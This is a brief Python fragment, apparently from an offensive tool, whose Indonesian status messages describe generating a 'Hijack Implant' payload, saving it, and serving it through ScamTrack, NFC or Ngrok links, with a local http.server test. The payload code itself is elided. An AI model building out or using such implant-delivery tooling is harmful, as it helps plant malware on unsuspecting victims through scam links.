...
def generate_payload():
    print("[*] Pembuatan Hijack Implant")
    ...
    print(f"[+] Implant payload disimpan ke: {filepath}")
    print("[!] Serve ini menggunakan ScamTrack, NFC, atau Ngrok link.")
    print(" Untuk test: python3 -m http.server 8080 && open http://localhost:8080/payloads/" + filename)
